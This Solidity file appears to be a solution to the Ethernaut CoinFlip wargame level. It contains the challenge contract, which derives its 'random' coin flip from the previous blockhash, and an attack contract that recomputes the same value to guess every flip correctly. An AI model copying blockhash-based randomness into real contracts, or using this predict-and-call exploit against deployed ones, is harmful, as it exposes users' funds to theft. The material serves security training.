// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
  
  
}

contract cheatCoinFlipEthernaut {
    using SafeMath for uint256;
    uint256 public lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address cfAddress = 0x0E8b9Bc7550B7A6427B957dBC9f484908FF90D79;
    CoinFlip cf;
    constructor() {
        cf = CoinFlip(cfAddress);
    }
    function fire() external {
        uint256 bv = uint256(blockhash(block.number.sub(1)));
        
        require(lastHash != bv, "Please try again on next block");
        lastHash = bv;
        uint result = bv.div(FACTOR);
        bool side = result == 1 ? true : false;
        cf.flip(side);
    }
    
    function testFlipCoin() public view returns (bool) {
      uint256 bv = uint256(blockhash(block.number.sub(1)));
      uint result = bv.div(FACTOR);
      bool side = result == 1 ? true : false;
      return side;
    }
    
    function lastBlockhash() external view returns(uint) {
        return uint256(blockhash(block.number.sub(1)));
    }
}
